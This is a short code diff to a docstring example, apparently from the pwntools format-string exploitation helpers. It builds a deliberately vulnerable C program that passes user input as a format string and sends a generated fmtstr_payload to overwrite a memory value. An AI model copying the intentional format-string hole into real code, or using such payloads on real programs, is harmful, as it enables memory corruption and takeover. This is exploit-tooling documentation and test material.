@@ -27,7 +27,7 @@ Examples:
     ...        *my_var = 0x41414141;
     ...        write(1, &my_var, sizeof(int *));
     ...        scanf("%s", buff);
-    ...        printf(buff);
+    ...        dprintf(2, buff);
     ...        write(1, my_var, sizeof(int));
     ...        return 0;
     ... }''')
@@ -40,7 +40,7 @@ Examples:
     ...
     >>> autofmt = FmtStr(exec_fmt)
     >>> offset = autofmt.offset
-    >>> p = process(program)
+    >>> p = process(program, stderr=subprocess.PIPE)
     >>> addr = unpack(p.recv(4))
     >>> payload = fmtstr_payload(offset, {addr: 0x1337babe})
     >>> p.sendline(payload)
